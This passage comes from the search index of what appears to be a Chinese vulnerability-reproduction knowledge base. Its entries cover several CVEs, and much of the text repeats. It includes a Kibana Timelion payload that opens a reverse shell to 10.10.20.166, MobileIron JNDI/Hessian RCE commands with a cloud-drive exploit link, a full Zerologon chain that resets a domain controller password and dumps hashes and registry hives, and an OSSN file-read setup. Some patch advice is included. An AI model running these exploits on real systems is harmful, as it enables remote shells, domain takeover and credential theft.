kibana\u4f4e\u4e8e6.6.0\u672a\u6388\u6743\u8fdc\u7a0b\u4ee3\u7801\u547d\u4ee4\u6267\u884c"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Kibana/CVE-2019-7609-kibana%E4%BD%8E%E4%BA%8E6.6.0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#cve-2019-7609-kibana660","text":"","title":"CVE-2019-7609-kibana&lt;6.6.0\u672a\u6388\u6743\u8fdc\u7a0b\u4ee3\u7801\u547d\u4ee4\u6267\u884c"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Kibana/CVE-2019-7609-kibana%E4%BD%8E%E4%BA%8E6.6.0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#poc","text":"\u5c06POC\u91cc\u7684\u53cd\u94feIP\u5730\u5740\u6362\u6210\u81ea\u5df1\u7684\uff0c\u7136\u540e\u5728\u76ee\u6807\u673a\u5668\u4e0a\u7684 Timelion \u9009\u9879\u4e0b\u5c06\u4ee5\u4e0b POC \u7c98\u8d34\u8fdb\u53bb\uff0c\u7136\u540e\u70b9\u51fb Run \u8fd0\u884c\uff1a .es(*).props(label.__proto__.env.AAAA='require(\"child_process\").exec(\"bash -i >& /dev/tcp/10.10.20.166/8989 0>&1\");process.exit()//') .props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ') \u7136\u540e\u81ea\u5df1\u673a\u5668\u5f00\u542f\u76d1\u542c\uff0c\u518d\u70b9\u51fb Canvas \u5373\u53ef\u51fa\u53d1\u6f0f\u6d1e\u3002","title":"POC"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Mobilelron/MobileIron%20MDM%20%E6%9C%AA%E6%8E%88%E6%9D%83RCE%20EXP/","text":"\u6b65\u9aa4 \u00b6 java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 0.0.0.0 -C \"<Command>\" java -cp ./marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian SpringAbstractBeanFactoryPointcutAdvisor rmi://<server-ip>:1099/<codebase> > exp python hessian.py -p exp -u 'https://mobileiron-mdm-instance/mifs/.;/services/LogService' EXP \u94fe\u63a5\uff1a https://pan.baidu.com/s/1jna0ZY-8BqRETUkYiJr5RQ \u63d0\u53d6\u7801\uff1anh3f","title":"MobileIron MDM \u672a\u6388\u6743RCE EXP"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Mobilelron/MobileIron%20MDM%20%E6%9C%AA%E6%8E%88%E6%9D%83RCE%20EXP/#_1","text":"java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 0.0.0.0 -C \"<Command>\" java -cp ./marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian SpringAbstractBeanFactoryPointcutAdvisor rmi://<server-ip>:1099/<codebase> > exp python hessian.py -p exp -u 'https://mobileiron-mdm-instance/mifs/.;/services/LogService' EXP \u94fe\u63a5\uff1a https://pan.baidu.com/s/1jna0ZY-8BqRETUkYiJr5RQ \u63d0\u53d6\u7801\uff1anh3f","title":"\u6b65\u9aa4"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Netlogon/Netlogon%20%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1472%EF%BC%89/","text":"\u80cc\u666f \u00b6 NetLogon\u7279\u6743\u63d0\u5347\u6f0f\u6d1e\uff08CVE-2020-1472\uff09\u7684\u8be6\u7ec6\u4fe1\u606f\u4e0e\u9a8c\u8bc1\u811a\u672c\uff0c\u5bfc\u81f4\u6f0f\u6d1e\u98ce\u9669\u9aa4\u7136\u63d0\u5347\u3002\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u653b\u51fb\u8005\u901a\u8fc7NetLogon\u8fdc\u7a0b\u534f\u8bae\uff08MS-NRPC\uff09\u5efa\u7acb\u4e0e\u57df\u63a7\u5236\u5668\u8fde\u63a5\u7684 \u5b89\u5168\u901a\u9053\u65f6\uff0c\u53ef\u5229\u7528\u6b64\u6f0f\u6d1e\u83b7\u53d6\u57df\u7ba1\u7406\u5458\u8bbf\u95ee\u6743\u9650\u3002\u6b64\u6f0f\u6d1e\u4e3a\u5fae\u8f6f8\u6708\u8865\u4e01\u66f4\u65b0\u65f6\u62ab\u9732\uff0cCVSS\u8bc4\u5206\u4e3a10\uff0c\u5f71\u54cd\u5e7f\u6cdb\uff0c\u8bf7\u76f8\u5173\u7528\u6237\u5c3d\u5feb\u91c7\u53d6\u63aa\u65bd\u8fdb\u884c\u9632\u62a4\u3002 \u53d7\u5f71\u54cd\u7248\u672c \u00b6 Windows Server 2008 R2 for x64-based Systems Service Pack 1 Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) Windows Server 2012 Windows Server 2012 (Server Core installation) Windows Server 2012 R2 Windows Server 2012 R2 (Server Core installation) Windows Server 2016 Windows Server 2016 (Server Core installation) Windows Server 2019 Windows Server 2019 (Server Core installation) Windows Server, version 1903 (Server Core installation) Windows Server, version 1909 (Server Core installation) Windows Server, version 2004 (Server Core installation) \u6f0f\u6d1e\u68c0\u6d4b \u00b6 poc \u94fe\u63a5\uff1a https://pan.baidu.com/s/1_RpVEA4W_Lo_ildh-FdqKQ \u63d0\u53d6\u7801\uff1atilx \u53d7\u5f71\u54cd\u7248\u672c\u4e3b\u673a\uff0c\u68c0\u6d4b\u9a8c\u8bc1\u7ed3\u679c\u5982\u4e0b\uff1a \u6f0f\u6d1e\u5229\u7528 \u00b6 1.\u91cd\u7f6e\u5bc6\u7801\uff0c\u83b7\u53d6\u57df\u5185\u6240\u6709\u7684\u7528\u6237hash\uff0c\u5229\u7528exp\uff1a` https://github.com/dirkjanm/CVE-2020-1472 ` py -3 cve-2020-1472-exploit.py dc-01 192.169.1.253 2.Dump\u57df\u63a7\u5236\u4e0a\u7684hash py -3 secretsdump.py xxxxx/dc-01\\$@192.168.1.253 -no-pass 3.\u5229\u7528\u83b7\u53d6\u5230\u7684\u7ba1\u7406\u5458hash\u8fdc\u7a0b\u8fde\u63a5\u5bfc\u51fasam\u6570\u636e\u5e93\u4e2d\u539f\u6765\u7684\u8ba1\u7b97\u673ahash``` py -3 wmiexec.py -hashes [hash] xxxx/administrator@192.168.1.253 reg save HKLM\\SYSTEM system.save reg save HKLM\\SAM sam.save reg saveHKLM\\SECURITY security.save get system.save get sam.save get security.save del /f system.save del /f sam.save del /f security.save exit py -3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL \u4ece\u800c\u83b7\u53d6\u5230MACHINE.ACC\uff1axxxxxxxxxxxxxxxxxxx 4.\u6062\u590dntds.dit\u4e2d\u7684\u8ba1\u7b97\u673ahash\u5e76\u9a8c\u8bc1\uff1a`https://github.com/risksense/zerologon` \u9700\u8981\u6ce8\u610f\u7684\u662f\u6700\u540e\u7684hash\u4f7f\u7528\u7684\u662f\u4e0a\u56fe\u83b7\u53d6\u5230\u7684MACHINE.ACC\u201d:\u201d\u540e\u9762\u7684\u90e8\u5206\u3002 py -3 reinstall_original_pw.py dc-01 192.168.253.163 [\u4e0a\u4e00\u6b65\u83b7\u53d6\u5230\u7684hash] 5.\u6700\u540e\u9a8c\u8bc1\u5bc6\u7801\u662f\u5426\u5df2\u7ecf\u6539\u56de\u53bb\uff0c\u6ce8\u610f\u7ed3\u5c3e\u662f$\u3002 py -3 secretsdump xxxx/administrator:admin123#@!.. @192 .168.1.253 -just-dc-user dc-01$ #### \u6f0f\u6d1e\u9632\u62a4 1)\u5b98\u65b9\u5347\u7ea7 \u76ee\u524d\u5fae\u8f6f\u5b98\u65b9\u5df2\u9488\u5bf9\u53d7\u652f\u6301\u7684\u4ea7\u54c1\u7248\u672c\u53d1\u5e03\u4e86\u4fee\u590d\u6b64\u6f0f\u6d1e\u7684\u5b89\u5168\u8865\u4e01\uff0c\u5f3a\u70c8\u5efa\u8bae\u53d7\u5f71\u54cd\u7528\u6237\u5c3d\u5feb\u5b89\u88c5\u8865\u4e01\u8fdb\u884c\u9632\u62a4\uff0c\u5b98\u65b9\u4e0b\u8f7d\u94fe\u63a5\uff1a `https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1472` 2\uff09\u5176\u4ed6\u9632\u62a4\u63aa\u65bd \u5728\u5b89\u88c5\u66f4\u65b0\u8865\u4e01\u540e\uff0c\u8fd8\u53ef\u901a\u8fc7\u90e8\u7f72\u57df\u63a7\u5236\u5668 (DC) \u5f3a\u5236\u6a21\u5f0f\u4ee5\u514d\u53d7\u5230\u8be5\u6f0f\u6d1e\u5f71\u54cd\uff1a \u8bf7\u53c2\u8003\u5b98\u65b9\u6587\u6863\u8fdb\u884c\u914d\u7f6e\u300a\u5982\u4f55\u7ba1\u7406\u4e0e CVE-2020-1472 \u76f8\u5173\u7684 Netlogon \u5b89\u5168\u901a\u9053\u8fde\u63a5\u7684\u66f4\u6539\u300b\uff1a `https://support.microsoft.com/zh-cn/help/4557222/how-to-manage-the-changes-in-netlogon-secure-channel-connections-assoc` #### \u6ce8\u610f\u4e8b\u9879 \u7531\u4e8e\u7f51\u7edc\u95ee\u9898\u3001\u8ba1\u7b97\u673a\u73af\u5883\u95ee\u9898\u7b49\u539f\u56e0\uff0cWindows Update\u7684\u8865\u4e01\u66f4\u65b0\u53ef\u80fd\u51fa\u73b0\u5931\u8d25\u3002\u7528\u6237\u5728\u5b89\u88c5\u8865\u4e01\u540e\uff0c\u5e94\u53ca\u65f6\u68c0\u67e5\u8865\u4e01\u662f\u5426\u6210\u529f\u66f4\u65b0\u3002 \u8865\u4e01\u66f4\u65b0\u786e\u8ba4\uff1a \u53f3\u952e\u70b9\u51fbWindows\u56fe\u6807\uff0c\u9009\u62e9\u201c\u8bbe\u7f6e(N)\u201d\uff0c\u9009\u62e9\u201c\u66f4\u65b0\u548c\u5b89\u5168\u201d-\u201cWindows\u66f4\u65b0\u201d\uff0c\u67e5\u770b\u8be5\u9875\u9762\u4e0a\u7684\u63d0\u793a\u4fe1\u606f\uff0c\u4e5f\u53ef\u70b9\u51fb\u201c\u67e5\u770b\u66f4\u65b0\u5386\u53f2\u8bb0\u5f55\u201d\u67e5\u770b\u5386\u53f2\u66f4\u65b0\u60c5\u51b5\u3002 \u9488\u5bf9\u672a\u6210\u529f\u5b89\u88c5\u7684\u66f4\u65b0\uff0c\u53ef\u70b9\u51fb\u66f4\u65b0\u540d\u79f0\u8df3\u8f6c\u5230\u5fae\u8f6f\u5b98\u65b9\u4e0b\u8f7d\u9875\u9762\uff0c\u5efa\u8bae\u7528\u6237\u70b9\u51fb\u8be5\u9875\u9762\u4e0a\u7684\u94fe\u63a5\uff0c\u8f6c\u5230\u201cMicrosoft\u66f4\u65b0\u76ee\u5f55\u201d\u7f51\u7ad9\u4e0b\u8f7d\u72ec\u7acb\u7a0b\u5e8f\u5305\u5e76\u5b89\u88c5\u3002 \u6f14\u793a\u622a\u56fe \u00b6 exp \u00b6 exp\u76ee\u524d\u5df2\u7ecf\u516c\u5e03\uff0c\u5730\u5740\u4e3a https://github.com/blackarrowsec/redteam-research","title":"Netlogon \u7279\u6743\u63d0\u5347\u6f0f\u6d1e\uff08CVE-2020-1472\uff09"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Netlogon/Netlogon%20%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1472%EF%BC%89/#_1","text":"NetLogon\u7279\u6743\u63d0\u5347\u6f0f\u6d1e\uff08CVE-2020-1472\uff09\u7684\u8be6\u7ec6\u4fe1\u606f\u4e0e\u9a8c\u8bc1\u811a\u672c\uff0c\u5bfc\u81f4\u6f0f\u6d1e\u98ce\u9669\u9aa4\u7136\u63d0\u5347\u3002\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u653b\u51fb\u8005\u901a\u8fc7NetLogon\u8fdc\u7a0b\u534f\u8bae\uff08MS-NRPC\uff09\u5efa\u7acb\u4e0e\u57df\u63a7\u5236\u5668\u8fde\u63a5\u7684 \u5b89\u5168\u901a\u9053\u65f6\uff0c\u53ef\u5229\u7528\u6b64\u6f0f\u6d1e\u83b7\u53d6\u57df\u7ba1\u7406\u5458\u8bbf\u95ee\u6743\u9650\u3002\u6b64\u6f0f\u6d1e\u4e3a\u5fae\u8f6f8\u6708\u8865\u4e01\u66f4\u65b0\u65f6\u62ab\u9732\uff0cCVSS\u8bc4\u5206\u4e3a10\uff0c\u5f71\u54cd\u5e7f\u6cdb\uff0c\u8bf7\u76f8\u5173\u7528\u6237\u5c3d\u5feb\u91c7\u53d6\u63aa\u65bd\u8fdb\u884c\u9632\u62a4\u3002","title":"\u80cc\u666f"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Netlogon/Netlogon%20%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1472%EF%BC%89/#_2","text":"Windows Server 2008 R2 for x64-based Systems Service Pack 1 Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) Windows Server 2012 Windows Server 2012 (Server Core installation) Windows Server 2012 R2 Windows Server 2012 R2 (Server Core installation) Windows Server 2016 Windows Server 2016 (Server Core installation) Windows Server 2019 Windows Server 2019 (Server Core installation) Windows Server, version 1903 (Server Core installation) Windows Server, version 1909 (Server Core installation) Windows Server, version 2004 (Server Core installation)","title":"\u53d7\u5f71\u54cd\u7248\u672c"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Netlogon/Netlogon%20%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1472%EF%BC%89/#_3","text":"poc \u94fe\u63a5\uff1a https://pan.baidu.com/s/1_RpVEA4W_Lo_ildh-FdqKQ \u63d0\u53d6\u7801\uff1atilx \u53d7\u5f71\u54cd\u7248\u672c\u4e3b\u673a\uff0c\u68c0\u6d4b\u9a8c\u8bc1\u7ed3\u679c\u5982\u4e0b\uff1a","title":"\u6f0f\u6d1e\u68c0\u6d4b"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Netlogon/Netlogon%20%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1472%EF%BC%89/#_4","text":"1.\u91cd\u7f6e\u5bc6\u7801\uff0c\u83b7\u53d6\u57df\u5185\u6240\u6709\u7684\u7528\u6237hash\uff0c\u5229\u7528exp\uff1a` https://github.com/dirkjanm/CVE-2020-1472 ` py -3 cve-2020-1472-exploit.py dc-01 192.169.1.253 2.Dump\u57df\u63a7\u5236\u4e0a\u7684hash py -3 secretsdump.py xxxxx/dc-01\\$@192.168.1.253 -no-pass 3.\u5229\u7528\u83b7\u53d6\u5230\u7684\u7ba1\u7406\u5458hash\u8fdc\u7a0b\u8fde\u63a5\u5bfc\u51fasam\u6570\u636e\u5e93\u4e2d\u539f\u6765\u7684\u8ba1\u7b97\u673ahash``` py -3 wmiexec.py -hashes [hash] xxxx/administrator@192.168.1.253 reg save HKLM\\SYSTEM system.save reg save HKLM\\SAM sam.save reg saveHKLM\\SECURITY security.save get system.save get sam.save get security.save del /f system.save del /f sam.save del /f security.save exit py -3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL \u4ece\u800c\u83b7\u53d6\u5230MACHINE.ACC\uff1axxxxxxxxxxxxxxxxxxx 4.\u6062\u590dntds.dit\u4e2d\u7684\u8ba1\u7b97\u673ahash\u5e76\u9a8c\u8bc1\uff1a`https://github.com/risksense/zerologon` \u9700\u8981\u6ce8\u610f\u7684\u662f\u6700\u540e\u7684hash\u4f7f\u7528\u7684\u662f\u4e0a\u56fe\u83b7\u53d6\u5230\u7684MACHINE.ACC\u201d:\u201d\u540e\u9762\u7684\u90e8\u5206\u3002 py -3 reinstall_original_pw.py dc-01 192.168.253.163 [\u4e0a\u4e00\u6b65\u83b7\u53d6\u5230\u7684hash] 5.\u6700\u540e\u9a8c\u8bc1\u5bc6\u7801\u662f\u5426\u5df2\u7ecf\u6539\u56de\u53bb\uff0c\u6ce8\u610f\u7ed3\u5c3e\u662f$\u3002 py -3 secretsdump xxxx/administrator:admin123#@!.. @192 .168.1.253 -just-dc-user dc-01$ #### \u6f0f\u6d1e\u9632\u62a4 1)\u5b98\u65b9\u5347\u7ea7 \u76ee\u524d\u5fae\u8f6f\u5b98\u65b9\u5df2\u9488\u5bf9\u53d7\u652f\u6301\u7684\u4ea7\u54c1\u7248\u672c\u53d1\u5e03\u4e86\u4fee\u590d\u6b64\u6f0f\u6d1e\u7684\u5b89\u5168\u8865\u4e01\uff0c\u5f3a\u70c8\u5efa\u8bae\u53d7\u5f71\u54cd\u7528\u6237\u5c3d\u5feb\u5b89\u88c5\u8865\u4e01\u8fdb\u884c\u9632\u62a4\uff0c\u5b98\u65b9\u4e0b\u8f7d\u94fe\u63a5\uff1a `https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1472` 2\uff09\u5176\u4ed6\u9632\u62a4\u63aa\u65bd \u5728\u5b89\u88c5\u66f4\u65b0\u8865\u4e01\u540e\uff0c\u8fd8\u53ef\u901a\u8fc7\u90e8\u7f72\u57df\u63a7\u5236\u5668 (DC) \u5f3a\u5236\u6a21\u5f0f\u4ee5\u514d\u53d7\u5230\u8be5\u6f0f\u6d1e\u5f71\u54cd\uff1a \u8bf7\u53c2\u8003\u5b98\u65b9\u6587\u6863\u8fdb\u884c\u914d\u7f6e\u300a\u5982\u4f55\u7ba1\u7406\u4e0e CVE-2020-1472 \u76f8\u5173\u7684 Netlogon \u5b89\u5168\u901a\u9053\u8fde\u63a5\u7684\u66f4\u6539\u300b\uff1a `https://support.microsoft.com/zh-cn/help/4557222/how-to-manage-the-changes-in-netlogon-secure-channel-connections-assoc` #### \u6ce8\u610f\u4e8b\u9879 \u7531\u4e8e\u7f51\u7edc\u95ee\u9898\u3001\u8ba1\u7b97\u673a\u73af\u5883\u95ee\u9898\u7b49\u539f\u56e0\uff0cWindows Update\u7684\u8865\u4e01\u66f4\u65b0\u53ef\u80fd\u51fa\u73b0\u5931\u8d25\u3002\u7528\u6237\u5728\u5b89\u88c5\u8865\u4e01\u540e\uff0c\u5e94\u53ca\u65f6\u68c0\u67e5\u8865\u4e01\u662f\u5426\u6210\u529f\u66f4\u65b0\u3002 \u8865\u4e01\u66f4\u65b0\u786e\u8ba4\uff1a \u53f3\u952e\u70b9\u51fbWindows\u56fe\u6807\uff0c\u9009\u62e9\u201c\u8bbe\u7f6e(N)\u201d\uff0c\u9009\u62e9\u201c\u66f4\u65b0\u548c\u5b89\u5168\u201d-\u201cWindows\u66f4\u65b0\u201d\uff0c\u67e5\u770b\u8be5\u9875\u9762\u4e0a\u7684\u63d0\u793a\u4fe1\u606f\uff0c\u4e5f\u53ef\u70b9\u51fb\u201c\u67e5\u770b\u66f4\u65b0\u5386\u53f2\u8bb0\u5f55\u201d\u67e5\u770b\u5386\u53f2\u66f4\u65b0\u60c5\u51b5\u3002 \u9488\u5bf9\u672a\u6210\u529f\u5b89\u88c5\u7684\u66f4\u65b0\uff0c\u53ef\u70b9\u51fb\u66f4\u65b0\u540d\u79f0\u8df3\u8f6c\u5230\u5fae\u8f6f\u5b98\u65b9\u4e0b\u8f7d\u9875\u9762\uff0c\u5efa\u8bae\u7528\u6237\u70b9\u51fb\u8be5\u9875\u9762\u4e0a\u7684\u94fe\u63a5\uff0c\u8f6c\u5230\u201cMicrosoft\u66f4\u65b0\u76ee\u5f55\u201d\u7f51\u7ad9\u4e0b\u8f7d\u72ec\u7acb\u7a0b\u5e8f\u5305\u5e76\u5b89\u88c5\u3002","title":"\u6f0f\u6d1e\u5229\u7528"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Netlogon/Netlogon%20%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1472%EF%BC%89/#_5","text":"","title":"\u6f14\u793a\u622a\u56fe"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Netlogon/Netlogon%20%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1472%EF%BC%89/#exp","text":"exp\u76ee\u524d\u5df2\u7ecf\u516c\u5e03\uff0c\u5730\u5740\u4e3a https://github.com/blackarrowsec/redteam-research","title":"exp"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/OSSN/OSSN%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-10560%EF%BC%89/","text":"\u3010\u6f0f\u6d1e\u8be6\u60c5\u3011 \u00b6 CVE-2020-10560 OSSN\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\uff0c\u95ee\u9898\u51fa\u73b0\u5728Open Source Social Network(OSSN)5.3\u53ca\u4e4b\u524d\u7248\u672c\u4e2d\u3002\u653b\u51fb\u8005\u53ef\u901a\u8fc7\u5bf9Site_Key\u5b9e\u65bd\u66b4\u529b\u7834\u89e3\u653b\u51fb\u6765\u4e3acomponents/OssnComments/ossn_com.php\u548clibraries/ossn.lib.upgrade.php\u63d2\u5165\u7279\u5236\u7684URL\uff0c\u7136\u540e\u5229\u7528\u8be5\u6f0f\u6d1e\u8bfb\u53d6\u4efb\u610f\u6587\u4ef6\u3002 \u3010\u73af\u5883\u642d\u5efa\u3011 \u00b6 1.\u9996\u5148\u901a\u8fc7git\u547d\u4ee4\u4ecegithub\u4e0a\u4e0b\u8f7dOSSN\u73af\u5883\uff0c\u8fd9\u91cc\u662f\u901a\u8fc7docker\u642d\u5efa\u6f0f\u6d1e\u590d\u73b0\u73af\u5883\u3002 git clone https://github.com/kevthehermit/CVE-2020-10560 1 2.\u7136\u540e\u4f7f\u7528docker-compose\u7f16\u8bd1\u542f\u52a8OSSN\u73af\u5883\u3002 \u6ce8\u610f\uff1a\u5982\u679c\u8fd9\u91cc\u7f16\u8bd1\u65f6\uff0c\u63d0\u793aapi\u7248\u672c\u4e0d\u5339\u914d\uff0c\u5efa\u8bae\u5378\u8f7d\u5b89\u88c5\u65e7\u7248\u672cdocker\u3002 3.\u7f16\u8bd1\u542f\u52a8\u5b8c\u6210\uff0c\u4f7f\u7528docker ps\u67e5\u770b\uff0c\u8868\u793a\u73af\u5883\u542f\u52a8\u6210\u529f\u3002 4.\u4f7f\u7528\u901a\u8fc7\u6d4f\u89c8\u5668\u8bbf\u95eeOSSN\u73af\u5883\uff0c\u9700\u8981\u8fdb\u884c\u5b89\u88c5\uff0c\u70b9\u51fb\u4e0b\u4e00\u6b65\u3002 5.\u70b9\u51fb\u4e0b\u4e00\u6b65\u3002 6.\u8fdb\u884c\u7f51\u7ad9\u8bbe\u7f6e\uff0c\u9700\u8981\u586b\u5199\u6570\u636e\u5e93\u4fe1\u606f\u548c\u7f51\u7ad9\u4fe1\u606f\uff08\u7f51\u7ad9\u540d\u79f0\u548c\u90ae\u7bb1\u53ef\u4ee5\u968f\u4fbf\u586b\u5199\uff09\uff0c\u70b9\u51fb\u4e0b\u4e00\u6b65\u3002 \u6ce8\u610f\uff1a\u8fd9\u91cc\u7684\u6570\u636e\u5e93\u4fe1\u606f\u586b\u5199\u5982\u4e0b\uff1a DB: ossn username: ossn password: ossn host: mysqlserver 12345 7.\u521b\u5efa\u7ba1\u7406\u8d26\u6237\uff0c\u6309\u8981\u6c42\u586b\u5199\u5373\u53ef\u3002 8.\u73af\u5883\u642d\u5efa\u5b8c\u6210\u3002 \u3010\u9a8c\u8bc1\u8be6\u60c5\u3011 \u00b6 \u9a8c\u8bc1\u6761\u4ef6 \u00b6 \u9996\u5148\u9700\u8981\u83b7\u53d6site_key\u7684\u503c\uff0c\u5728\u5b9e\u9645\u73af\u5883\u4e2d\u53ef\u4ee5\u901a\u8fc7\u811a\u672c\u7206\u7834\u7684\u65b9\u5f0f\u6765\u83b7\u53d6\uff0csite_key\u7206\u7834\u811a\u672c\u53c2\u8003\u94fe\u63a5\uff1a https://github.com/LucidUnicorn/CVE-2020-10560-Key-Recovery/releases \u56e0\u4e3a\u8fd9\u91cc\u6211\u4eec\u662f\u5728\u672c\u5730\u4f7f\u7528docker\u642d\u5efa\u7684\u590d\u73b0\u73af\u5883\uff0c\u6211\u4eec\u76f4\u63a5\u53d6\u6570\u636e\u5e93\u67e5\u8be2site_key\u503c\u5373\u53ef\u3002 1.\u53ef\u4ee5\u770b\u5230\u8fd9\u91cc\u6709\u4e00\u4e2amysql\u7684\u4e3b\u673a\uff0c\u4f7f\u7528mysql\u7528\u6237\u540d\u548c\u5bc6\u7801\u8fde\u63a5\u6570\u636e\u5e93\uff08ossn/ossn\uff09\u3002 2.\u67e5\u8be2\u6570\u636e\u5e93\u4e2d\u7684\u8868ossn_ site_settings\uff0c\u627e\u5230site_key\u7684\u503c\u3002 \u9a8c\u8bc1\u8fc7\u7a0b \u00b6 1.\u590d\u5236\u521a\u624d\u6211\u4eec\u4ecegithub\u4e0a\u4e0b\u8f7d\u7684poc\u8fdb\u884c\u6f0f\u6d1e\u5229\u7528\u3002 2.\u7136\u540e\u4f7f\u7528python3\u6267\u884c\u811a\u672c\uff0c\u4f9d\u6b21\u586b\u5199site_key\uff0c\u8bfb\u53d6\u7684\u6587\u4ef6\uff0c\u76ee\u6807\u7f51\u7ad9\u5730\u5740\uff0c\u53ef\u4ee5\u770b\u5230\u6210\u529f\u8bfb\u53d6\u5230\u4e86\u76ee\u6807\u7cfb\u7edf\u7684passwd\u6587\u4ef6\u5185\u5bb9\u3002 \u3010\u9632\u5fa1\u65b9\u5f0f\u3011 \u00b6 \u76ee\u524d\u5382\u5546\u5df2\u53d1\u5e03\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u6f0f\u6d1e\uff0c\u8be6\u60c5\u8bf7\u5173\u6ce8\u5382\u5546\u4e3b\u9875\uff1a https://www.opensource-socialnetwork.org/ \u3010\u53c2\u8003\u8d44\u6599\u3011 \u00b6 https://techanarchy.net/blog/cve-2020-10560-ossn-arbitrary-file-read","title":"OSSN\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\uff08CVE 2020 10560\uff09"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/OSSN/OSSN%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-10560%EF%BC%89/#_1","text":"CVE-2020-10560 OSSN\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\uff0c\u95ee\u9898\u51fa\u73b0\u5728Open Source Social Network(OSSN)5.3\u53ca\u4e4b\u524d\u7248\u672c\u4e2d\u3002\u653b\u51fb\u8005\u53ef\u901a\u8fc7\u5bf9Site_Key\u5b9e\u65bd\u66b4\u529b\u7834\u89e3\u653b\u51fb\u6765\u4e3acomponents/OssnComments/ossn_com.php\u548clibraries/ossn.lib.upgrade.php\u63d2\u5165\u7279\u5236\u7684URL\uff0c\u7136\u540e\u5229\u7528\u8be5\u6f0f\u6d1e\u8bfb\u53d6\u4efb\u610f\u6587\u4ef6\u3002","title":"\u3010\u6f0f\u6d1e\u8be6\u60c5\u3011"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/OSSN/OSSN%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-10560%EF%BC%89/#_2","text":"1.\u9996\u5148\u901a\u8fc7git\u547d\u4ee4\u4ecegithub\u4e0a\u4e0b\u8f7dOSSN\u73af\u5883\uff0c\u8fd9\u91cc\u662f\u901a\u8fc7docker\u642d\u5efa\u6f0f\u6d1e\u590d\u73b0\u73af\u5883\u3002 git clone https://github.com/kevthehermit/CVE-2020-10560 1 2.\u7136\u540e\u4f7f\u7528docker-compose\u7f16\u8bd1\u542f\u52a8OSSN\u73af\u5883\u3002 \u6ce8\u610f\uff1a\u5982\u679c\u8fd9\u91cc\u7f16\u8bd1\u65f6\uff0c\u63d0\u793aapi\u7248\u672c\u4e0d\u5339\u914d\uff0c\u5efa\u8bae\u5378\u8f7d\u5b89\u88c5\u65e7\u7248\u672cdocker\u3002 3.\u7f16\u8bd1\u542f\u52a8\u5b8c\u6210\uff0c\u4f7f\u7528docker ps\u67e5\u770b\uff0c\u8868\u793a\u73af\u5883\u542f\u52a8\u6210\u529f\u3002 4.\u4f7f\u7528\u901a\u8fc7\u6d4f\u89c8\u5668\u8bbf\u95eeOSSN\u73af\u5883\uff0c\u9700\u8981\u8fdb\u884c\u5b89\u88c5\uff0c\u70b9\u51fb\u4e0b\u4e00\u6b65\u3002 5.\u70b9\u51fb\u4e0b\u4e00\u6b65\u3002 